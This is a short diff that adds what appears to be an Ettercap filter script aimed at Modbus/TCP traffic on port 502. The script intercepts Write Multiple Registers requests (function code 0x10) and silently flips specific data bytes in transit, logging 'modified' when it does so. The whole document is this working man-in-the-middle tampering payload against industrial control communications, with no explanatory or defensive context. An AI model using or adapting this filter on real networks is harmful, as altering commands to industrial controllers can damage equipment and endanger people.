@@ -1,0 +1,9 @@
+if (tcp.dst == 502){
+	if (DATA.data + 7 == 0x10){
+		if (DATA.data + 16 == 0x01){
+			msg("modified");
+			DATA.data + 16 = 0x00;
+			DATA.data + 14 = 0x01;
+		}
+	}
+}
